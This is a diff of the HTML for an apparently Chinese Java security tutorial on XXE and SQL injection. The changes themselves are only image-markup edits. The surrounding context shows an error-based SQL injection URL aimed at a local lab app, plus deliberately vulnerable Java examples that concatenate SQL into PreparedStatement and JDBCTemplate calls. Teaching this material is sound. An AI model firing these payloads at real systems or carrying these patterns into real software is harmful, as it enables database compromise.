@@ -895,7 +1130,12 @@ XXE 攻击可能导致敏感信息泄露、服务拒绝（DoS）攻击等安全�
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> e.<span style="color:#a6e22e">toString</span>();
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_2.png" alt=""  />
+</span></span></code></pre></div><p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_2.png" alt="" /></figure>
+
+
+
 修复方法就是上面代码中的,setFeature,禁用外部实体</p>
 <h3 id="saxparser">SAXParser</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">/**
@@ -916,8 +1156,18 @@ XXE 攻击可能导致敏感信息泄露、服务拒绝（DoS）攻击等安全�
 </span></span><span style="display:flex;"><span>	}
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>会有报错信息,但是dnslog弹成功了
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_7.png" alt=""  />
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_8.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_7.png" alt="" /></figure>
+
+
+
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_8.png" alt="" /></figure>
+
+
+</p>
 <h3 id="saxreader">SAXReader</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">/**
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * SAXReader 是一个用于读取和解析 XML 文档的类。它基于 SAX (Simple API for XML) 实现，
@@ -1090,9 +1340,19 @@ XXE 攻击可能导致敏感信息泄露、服务拒绝（DoS）攻击等安全�
 <p>Mybatis与Hibernate这样的ORM（对象关系映射）框架不同，它更关注SQL本身，适合对数据库操作有较高控制要求的场景。其高效、灵活和简洁的特性，使得它在企业级开发中被广泛使用。</p>
 <h2 id="复现环境">复现环境</h2>
 <p><a href="https://github.com/j3ers3/Hello-Java-Sec" target="_blank" rel="noopener nofollow noreferrer" >Hello-Java-Sec</a>
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-sql%e6%b3%a8%e5%85%a5_image_1.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-sql%e6%b3%a8%e5%85%a5_image_1.png" alt="" /></figure>
+
+
+
 <a href="https://github.com/bewhale/JavaSec" target="_blank" rel="noopener nofollow noreferrer" >JavaSec</a>
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-sql%e6%b3%a8%e5%85%a5_image_2.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-sql%e6%b3%a8%e5%85%a5_image_2.png" alt="" /></figure>
+
+
+</p>
 <h2 id="jdbc-1">JDBC</h2>
 <p>JDBC有两个方法执行SQL语句，分别是PrepareStatement和Statement。</p>
 <p>JDBCTemplate是Spring对JDBC的封装</p>
@@ -1112,7 +1372,12 @@ XXE 攻击可能导致敏感信息泄露、服务拒绝（DoS）攻击等安全�
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>报错注入的语法</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>http://127.0.0.1:8888/SQLI/JDBC/vul1?id<span style="color:#f92672">=</span>1%27%20and%20updatexml<span style="color:#f92672">(</span>1,concat<span style="color:#f92672">(</span>0x7e,<span style="color:#f92672">(</span>SELECT%20user<span style="color:#f92672">())</span>,0x7e<span style="color:#f92672">)</span>,1<span style="color:#f92672">)</span>--%20+
-</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-sql%e6%b3%a8%e5%85%a5_image_3.png" alt=""  /></p>
+</span></span></code></pre></div><p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-sql%e6%b3%a8%e5%85%a5_image_3.png" alt="" /></figure>
+
+
+</p>
 <h3 id="preparestatement">PrepareStatement</h3>
 <p>这里是使用了预编译,但是没有按照预编译的语法来写,还是有漏洞存在</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// PrepareStatement会对SQL语句进行预编译，但如果直接采取拼接的方式构造SQL，此时进行预编译也无用。</span>
@@ -1124,7 +1389,12 @@ XXE 攻击可能导致敏感信息泄露、服务拒绝（DoS）攻击等安全�
 </span></span><span style="display:flex;"><span>    PreparedStatement st <span style="color:#f92672">=</span> conn.<span style="color:#a6e22e">prepareStatement</span>(sql);
 </span></span><span style="display:flex;"><span>    ResultSet rs <span style="color:#f92672">=</span> st.<span style="color:#a6e22e">executeQuery</span>();
 </span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-sql%e6%b3%a8%e5%85%a5_image_4.png" alt=""  /></p>
+</span></span></code></pre></div><p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/javasec-sql%e6%b3%a8%e5%85%a5_image_4.png" alt="" /></figure>
+
+
+</p>
 <h3 id="jdbctemplate">JDBCTemplate</h3>
 <p>也是一样的,如果使用拼接,而不是使用占位符,就会导致SQL注入</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// JDBCTemplate是Spring对JDBC的封装，如果使用拼接语句便会产生注入</span>
